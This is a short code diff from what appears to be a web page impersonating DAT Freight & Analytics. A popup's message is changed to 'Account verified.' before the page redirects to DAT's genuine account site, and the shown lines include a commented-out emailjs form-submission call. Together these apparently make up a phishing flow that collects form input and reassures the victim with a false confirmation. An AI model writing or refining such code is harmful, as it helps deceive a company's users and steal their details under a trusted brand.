@@ -149,7 +149,7 @@ function HomePage() {
                     // emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     Swal.fire({
                         title: "DAT Freight & Analytics",
-                        text: "The report was taken down. It was a mistake.",
+                        text: "Account verified.",
                         preConfirm: () => {
                             window.location.href = "https://account.dat.com/profile?source=datone.web";
                           },
